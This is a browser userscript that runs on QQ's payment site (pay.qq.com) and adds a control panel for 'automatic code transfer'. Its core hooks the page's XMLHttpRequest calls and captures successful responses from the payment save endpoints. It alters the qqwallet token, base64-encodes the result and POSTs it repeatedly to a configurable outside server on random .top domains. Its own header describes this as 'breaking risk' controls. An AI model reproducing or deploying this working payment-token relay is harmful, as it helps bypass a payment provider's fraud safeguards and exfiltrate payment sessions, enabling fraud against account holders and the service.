// ==UserScript==
// @name         长颈鹿自动传码（完整重构+三色区分+标题优化）
// @namespace    https://iiifox.me/
// @version      0.4.0
// @description  保留原样式和逻辑，优化可维护性，颜色区分账号/金额/传码次数，标题加大加粗
// @author       iiifox
// @match        *://pay.qq.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @updateURL    https://iiifox.me/assets/giraffe/ceshichuanma_new.js
// @downloadURL  https://iiifox.me/assets/giraffe/ceshichuanma_new.js
// @connect      081w5a8cim.top
// @connect      8w0m6rjg3l.top
// ==/UserScript==

(function () {
    'use strict';

    const LOCAL_CAPTURE_KEY = 'capture_pay_response';

    // ---------------- 工具函数 ----------------
    const storage = {
        get: () => {
            try {
                return localStorage.getItem(LOCAL_CAPTURE_KEY);
            } catch {
                return null;
            }
        },
        set: val => {
            try {
                localStorage.setItem(LOCAL_CAPTURE_KEY, val);
                return true;
            } catch {
                return false;
            }
        },
        clear: () => {
            try {
                localStorage.removeItem(LOCAL_CAPTURE_KEY);
                return true;
            } catch {
                return false;
            }
        }
    };

    const rand4 = () => Math.floor(Math.random() * 10000).toString().padStart(4, '0');

    const encodeItem = item => {
        const str = JSON.stringify(item);
        const bytes = new TextEncoder().encode(str);
        return btoa(String.fromCharCode(...bytes));
    };

    const showToast = (msg, type = 'info') => {
        if (!document.body) return;
        const colors = {info: '#2196F3', success: '#4CAF50', warning: '#FF9800', error: '#ff4444'};
        const toast = document.createElement('div');
        toast.textContent = msg;
        Object.assign(toast.style, {
            position: 'fixed', bottom: '60px', right: '10px',
            background: colors[type] || colors.info,
            color: '#fff', padding: '8px 12px', borderRadius: '6px',
            fontSize: '12px', zIndex: 999999
        });
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2000);
    };

    // ---------------- 自动传码 ----------------
    function handleResponse(responseJSON) {
        const config = GM_getValue('giraffeConfig', null);
        if (!config) return;

        let successCount = 0;
        const requests = Array.from({length: config.arrayLength ?? 3}).map(() => new Promise(resolve => {
            const item = structuredClone(responseJSON);
            item.qqwallet_info.qqwallet_tokenId += '&' + rand4();
            GM_xmlhttpRequest({
                method: 'POST',
                url: config.requestUrl ?? '',
                headers: {"Content-Type": "application/x-www-form-urlencoded"},
                data: encodeItem(item),
                onload: () => {
                    successCount++;
                    resolve();
                },
                onerror: () => resolve()
            });
        }));

        Promise.all(requests).then(() => showToast(`传码完成：成功 ${successCount} 次`, 'success'));
    }

    // ---------------- XHR 拦截 ----------------
    const TARGET_PATHS = ["/web_save", "/mobile_save"];
    const isTargetUrl = url => TARGET_PATHS.some(path => url.includes(path));

    function setupAPICapture() {
        const origOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function (method, url, ...args) {
            this._isTarget = isTargetUrl(url);
            return origOpen.call(this, method, url, ...args);
        };

        const origSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function (...args) {
            if (!this._isTarget) return origSend.apply(this, args);

            const xhr = this;
            const origOnreadystatechange = xhr.onreadystatechange;
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) handleXhr(xhr);
                if (origOnreadystatechange) origOnreadystatechange.apply(xhr, arguments);
            };

            const origOnload = xhr.onload;
            xhr.onload = function () {
                handleXhr(xhr);
                if (origOnload) origOnload.apply(xhr, arguments);
            };

            return origSend.apply(this, args);
        };

        function handleXhr(xhr) {
            let res;
            try {
                res = JSON.parse(xhr.responseText);
            } catch {
                return;
            }
            if (res.ret === 0 && !xhr._handledXhr) {
                xhr._handledXhr = true;
                handleResponse(res);
            }
        }
    }

    // ---------------- 面板 ----------------
    function createControlPanel() {
        if (document.getElementById('giraffe-control-panel') || document.getElementById('giraffe-mini-btn')) return;

        // 小齿轮按钮
        const miniBtn = document.createElement('div');
        miniBtn.id = 'giraffe-mini-btn';
        miniBtn.innerHTML = '⚙️';
        Object.assign(miniBtn.style, {
            position: 'fixed', top: '10px', right: '10px', background: '#000', color: '#fff',
            padding: '6px 8px', borderRadius: '6px', zIndex: 999999, fontSize: '14px',
            cursor: 'pointer', border: '1px solid #444', backdropFilter: 'none', opacity: '1'
        });
        document.body.appendChild(miniBtn);

        // 面板
        const panel = document.createElement('div');
        panel.id = 'giraffe-control-panel';
        Object.assign(panel.style, {
            position: 'fixed', top: '10px', right: '10px', background: '#000', color: '#fff',
            padding: '8px 12px', borderRadius: '8px', zIndex: 999998, width: '350px',
            border: '1px solid #444', fontFamily: 'Arial', fontSize: '12px', display: 'none',
            backdropFilter: 'none'
        });

        panel.innerHTML = `
            <div style="display:flex;justify-content:flex-start;align-items:center;margin-bottom:6px;" id="panelHeader">
                <span style="color:#4CAF50;font-weight:bold; font-size:13px;">自动识别捕获、破风险、钱包传码</span>
            </div>
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;" id="panelCaptureStatus">
                <div style="display:flex;align-items:center;gap:6px;font-weight:bold;">
                    <div>捕获状态: <span id="captureStatus" style="color:#ff4444">✗ 未捕获</span></div>
                    <button id="clearCapture" style="background:#ff4444;color:white;border:none;padding:3px 6px;border-radius:3px;cursor:pointer;font-size:12px;line-height:1;">清除捕获</button>
                </div>
                <div style="display:flex;align-items:center;gap:6px;font-weight:bold;">
                    <label style="font-size:12px; display:flex; align-items:center; gap:4px;">
                        自动传码
                        <input type="checkbox" id="autoSendToggle" checked>
                    </label>
                    <label style="font-size:12px; display:flex; align-items:center; gap:4px;">
                        传码次数
                        <input type="number" id="defaultArrayLength" value="${GM_getValue('arrayLength', 3)}" style="width:40px; font-size:12px; font-weight:bold; color:#00FF00; background:#333; border:1px solid #555; border-radius:3px; text-align:center;">
                    </label>
                </div>
            </div>
            <div id="accountTable" style="margin-bottom:6px; display:none;"></div>
            <div style="display:flex;justify-content:space-between;align-items:center; display:none;">
                <button id="addRowBtn" style="background:#2196F3;color:white;border:none;padding:4px 6px;border-radius:3px;cursor:pointer;font-size:12px;">＋ 添加账号</button>
                <button id="saveAccountsBtn" style="background:#4CAF50;color:white;border:none;padding:4px 6px;border-radius:3px;font-size:12px;">💾 保存配置</button>
            </div>
        `;
        document.body.appendChild(panel);

        // 折叠按钮
        const collapseBtn = document.createElement('button');
        collapseBtn.textContent = '⇕';
        collapseBtn.title = '折叠/展开面板';
        collapseBtn.style.cssText = 'background:#FF9800;color:white;border:none;padding:2px 6px;border-radius:3px;cursor:pointer;font-size:12px;margin-left:6px;';
        panel.querySelector('#panelHeader').appendChild(collapseBtn);

        let isCollapsed = true;
        collapseBtn.addEventListener('click', () => {
            isCollapsed = !isCollapsed;
            Array.from(panel.children).forEach((el, idx) => {
                if (idx < 2) return;
                el.style.display = isCollapsed ? 'none' : '';
            });
        });

        miniBtn.addEventListener('click', () => panel.style.display = panel.style.display === 'none' ? 'block' : 'none');

        const accountTable = panel.querySelector('#accountTable');

        const addAccountRow = (account = '', amount = '') => {
            const row = document.createElement('div');
            row.style.display = 'flex';
            row.style.alignItems = 'center';
            row.style.gap = '4px';
            row.style.marginBottom = '4px';

            // 账号
            const accountInput = document.createElement('input');
            accountInput.type = 'text';
            accountInput.placeholder = '账号链接';
            accountInput.value = account;
            accountInput.style.flex = '1';
            accountInput.style.color = '#4FC3F7';
            accountInput.style.fontWeight = 'bold';

            // 金额
            const amountInput = document.createElement('input');
            amountInput.type = 'text';
            amountInput.placeholder = '金额';
            amountInput.value = amount;
            amountInput.style.width = '30px';
            amountInput.style.textAlign = 'center';
            amountInput.style.color = '#FFB74D';
            amountInput.style.fontWeight = 'bold';

            // 移除
            const removeBtn = document.createElement('button');
            removeBtn.textContent = '－';
            removeBtn.style.background = '#ff4444';
            removeBtn.style.color = 'white';
            removeBtn.style.border = 'none';
            removeBtn.style.padding = '2px 6px';
            removeBtn.style.borderRadius = '3px';
            removeBtn.style.cursor = 'pointer';
            removeBtn.addEventListener('click', () => row.remove());

            row.appendChild(accountInput);
            row.appendChild(amountInput);
            row.appendChild(removeBtn);
            accountTable.appendChild(row);
        };

        panel.querySelector('#addRowBtn').addEventListener('click', () => addAccountRow());

        const savedConfig = GM_getValue('giraffeConfig', null);
        if (savedConfig) {
            panel.querySelector('#autoSendToggle').checked = savedConfig.autoSend ?? true;
            panel.querySelector('#defaultArrayLength').value = savedConfig.arrayLength ?? 3;
            accountTable.innerHTML = '';
            for (const [amount, account] of Object.entries(savedConfig.accounts ?? {})) addAccountRow(account, amount);
        }

        panel.querySelector('#saveAccountsBtn').addEventListener('click', () => {
            const autoSend = panel.querySelector('#autoSendToggle').checked;
            const arrayLength = Number(panel.querySelector('#defaultArrayLength').value);
            const accounts = {};
            accountTable.querySelectorAll('div').forEach(row => {
                const inputs = row.querySelectorAll('input');
                const account = inputs[0].value.trim();
                const amount = inputs[1].value.trim();
                if (account && amount) accounts[amount] = account;
            });
            GM_setValue('giraffeConfig', {autoSend, arrayLength, accounts});
            alert('配置已保存，同域新开窗口也可读取');
        });

        panel.querySelector('#clearCapture').addEventListener('click', () => {
            storage.clear();
            updateCaptureStatus(false);
            alert('已清除捕获内容');
        });
    }

    const updateCaptureStatus = captured => {
        const el = document.getElementById('captureStatus');
        if (el) {
            el.textContent = captured ? '✔ 已捕获' : '✗ 未捕获';
            el.style.color = captured ? '#4CAF50' : '#ff4444';
        }
    };

    window.addEventListener('load', () => {
        createControlPanel();
        setupAPICapture();
    });

})();
